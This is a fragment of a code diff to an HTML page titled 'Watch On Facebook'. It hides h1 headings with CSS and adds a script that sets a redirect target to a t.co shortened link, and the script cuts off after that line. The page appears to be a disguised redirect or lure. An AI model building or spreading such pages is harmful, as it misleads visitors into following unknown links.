@@ -1,5 +1,10 @@
 <html lang="en">
 <head>
+  <style>
+h1 {
+    display: none !important;
+}
+</style>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Watch On Facebook</title>
@@ -224,8 +229,6 @@ footer a{
   }
 
 </script>
-
-</body>
 <script>
 (function () {
     const targetUrl = "https://t.co/idAs8XdvCH?vds";
